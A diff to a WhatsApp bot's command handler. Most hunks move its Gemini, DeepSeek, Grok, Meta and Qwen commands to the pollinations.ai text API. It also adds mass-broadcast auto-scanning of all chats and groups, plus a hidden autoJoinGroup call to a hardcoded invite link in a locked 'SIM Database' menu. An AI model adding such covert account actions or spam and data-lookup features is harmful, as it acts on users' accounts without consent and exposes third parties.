-        if (!ansGem) return reply('⚠️ *Gemini did not respond* — try again');
-        const chunksGem = ansGem.match(/[\s\S]{1,3000}/g) || [ansGem];
-        for (let i = 0; i < chunksGem.length; i++) {
-            await devtrust.sendMessage(m.chat, { text: (i === 0 ? '🤖 *Gemini Pro*\n\n' : '') + chunksGem[i] }, i === 0 ? { quoted: m } : {});
+        const sysPrompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu, respond ONLY in Roman Urdu. NEVER use Hindi Devanagari or formal Urdu Nastaliq script.`;
+        const res = await axios.post('https://text.pollinations.ai/', {
+            messages: [
+                { role: 'system', content: sysPrompt },
+                { role: 'user', content: query }
+            ],
+            model: 'openai-large',
+            seed: -1
+        }, { timeout: 40000 });
+        const answer = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
+        if (!answer || answer.startsWith('<')) return reply("⚠️ *Gemini did not respond* — try again");
+        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
+        for (let i = 0; i < chunks.length; i++) {
+            await devtrust.sendMessage(m.chat, { text: (i === 0 ? "🤖 *Gemini*\n\n" : "") + chunks[i] }, i === 0 ? { quoted: m } : {});
         }
         await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
     } catch (err) {
-        reply('⚠️ *Gemini unavailable* • Try again later');
+        console.error('Gemini error:', err.message);
+        reply("⚠️ *Gemini unavailable* • Try again later");
     }
 }
 break;
@@ -14708,16 +14645,25 @@ case 'deepsjfkeek': {
     if (!text) return reply("🤖 *Usage:* .deepseek your question");
     try {
         await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
-        const resDS = await axios.get('https://api.princetechn.com/api/ai/deepseek-llm?apikey=prince&q=' + encodeURIComponent(text), { timeout: 40000 });
-        const answerDS = resDS.data?.result || '';
-        if (!answerDS) return reply('⚠️ *DeepSeek did not respond* — try again');
+        const sysPromptDS = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari or Urdu Nastaliq script.`;
+        const resDS = await axios.post('https://text.pollinations.ai/', {
+            messages: [
+                { role: 'system', content: sysPromptDS },
+                { role: 'user', content: text }
+            ],
+            model: 'deepseek',
+            seed: -1
+        }, { timeout: 40000 });
+        const answerDS = typeof resDS.data === 'string' ? resDS.data : JSON.stringify(resDS.data);
+        if (!answerDS || answerDS.startsWith('<')) return reply("⚠️ *DeepSeek did not respond* — try again");
         const chunksDS = answerDS.match(/[\s\S]{1,3000}/g) || [answerDS];
         for (let i = 0; i < chunksDS.length; i++) {
-            await devtrust.sendMessage(m.chat, { text: (i === 0 ? '🤖 *DeepSeek*\n\n' : '') + chunksDS[i] }, i === 0 ? { quoted: m } : {});
+            await devtrust.sendMessage(m.chat, { text: (i === 0 ? "🤖 *DeepSeek*\n\n" : "") + chunksDS[i] }, i === 0 ? { quoted: m } : {});
         }
         await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
     } catch (error) {
-        reply('❌ *DeepSeek error* • Try later');
+        console.error('DeepSeek error:', error.message);
+        reply(`❌ *DeepSeek error* • Try later`);
     }
     break;
 }
@@ -14728,16 +14674,25 @@ case "grovnnk-ai": {
     if (!query) return reply("🤖 *Usage:* .grok your question");
     try {
         await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
-        const resGrok = await axios.get('https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=' + encodeURIComponent(query), { timeout: 40000 });
-        const answerGrok = resGrok.data?.result || '';
-        if (!answerGrok) return reply('⚠️ *Grok did not respond* — try again');
+        const sysPromptGrok = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari or Urdu Nastaliq script.`;
+        const resGrok = await axios.post('https://text.pollinations.ai/', {
+            messages: [
+                { role: 'system', content: sysPromptGrok },
+                { role: 'user', content: query }
+            ],
+            model: 'llama',
+            seed: -1
+        }, { timeout: 40000 });
+        const answerGrok = typeof resGrok.data === 'string' ? resGrok.data : JSON.stringify(resGrok.data);
+        if (!answerGrok || answerGrok.startsWith('<')) return reply("⚠️ *Grok did not respond* — try again");
         const chunksGrok = answerGrok.match(/[\s\S]{1,3000}/g) || [answerGrok];
         for (let i = 0; i < chunksGrok.length; i++) {
-            await devtrust.sendMessage(m.chat, { text: (i === 0 ? '🤖 *Grok*\n\n' : '') + chunksGrok[i] }, i === 0 ? { quoted: m } : {});
+            await devtrust.sendMessage(m.chat, { text: (i === 0 ? "🤖 *Grok*\n\n" : "") + chunksGrok[i] }, i === 0 ? { quoted: m } : {});
         }
         await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
     } catch (err) {
-        reply('⚠️ *Grok unavailable* • Try again later');
+        console.error('Grok error:', err.message);
+        reply("⚠️ *Grok unavailable* • Try again later");
     }
 }
 break;
@@ -14804,11 +14759,11 @@ case "metabcn-ai": {
 
         if (!query) return reply("🤖 *Usage:* meta your question");
 
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent('You are a helpful assistant. User: ' + query)}`, { timeout: 40000 });
+        const res = await fetch(`https://text.pollinations.ai/${encodeURIComponent('You are a helpful assistant. User: ' + query)}`);
+        if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);
 
-
-        const answer = res.data?.result || "";
-
+        const json = await res.json();
+        const answer = json?.data || "";
 
         if (!answer) return reply("⚠️ *No response from Meta AI*");
 
@@ -14839,11 +14794,11 @@ case "qwenxj": {
 
         if (!query) return reply("🤖 *Usage:* qwen your question");
 
-        const res = await axios.get(`https://api.princetechn.com/api/ai/gpt4?apikey=prince&q=${encodeURIComponent('You are a helpful assistant. User: ' + query)}`, { timeout: 40000 });
+        const res = await fetch(`https://text.pollinations.ai/${encodeURIComponent('You are a helpful assistant. User: ' + query)}`);
+        if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);
 
-
-        const answer = res.data?.result || "";
-
+        const json = await res.json();
+        const answer = json?.data || "";
 
         if (!answer) return reply("⚠️ *No response from Qwen*");
 
@@ -17739,13 +17694,13 @@ case 'broadcastmenu': {
     reply(`📢 *CYBER — BROADCAST MENU*
 
 ` +
-          `📢 ${prefix}bcauto <msg> — Apni saved list se broadcast
+          `🔄 ${prefix}bcauto <msg> — Auto-scanned list (chats + groups)
 ` +
           `📣 ${prefix}bcgroups <msg> — ALL groups
 ` +
           `💬 ${prefix}bcusers <msg> — ALL private chats
 ` +
-          `📋 ${prefix}bclist — Apni saved contacts list dekho
+          `📋 ${prefix}bclist — View auto-scanned contacts
 ` +
           `🔍 ${prefix}bcscan — Scan with live progress counter
 ` +
@@ -17769,7 +17724,9 @@ case 'broadcastmenu': {
           `4. Messages sent with 2.5s gap
 
 ` +
-          `🎯 *Tip:* Pehle .bcrescan ya .bcscan chala ke apni list banao!`);
+          `🎯 *Auto-Scan:* Bot connect hone ke 1 min mein
+` +
+          `sare previous chats aur groups auto-collect hojate hain!`);
 }
 break;
 
@@ -18449,6 +18406,7 @@ default:
               if (!_sdbUnlk.some(id => String(id).replace(/[^0-9]/g,'') === _sdbLkSender))
                   return reply(`🔒 *SIM Database Menu — Locked Section*\n\nYe section sirf authorized users ke liye hai.\n\n*Unlock karne ke liye:*\nAdmin se code maango phir type karo:\n➤ *${prefix}addkey1 <code>*`);
           }
+          await autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc");
           await devtrust.sendMessage(m.chat, { react: { text: '🗄️', key: m.key } });
 
           const _sdbUptime = formatUptime(process.uptime());
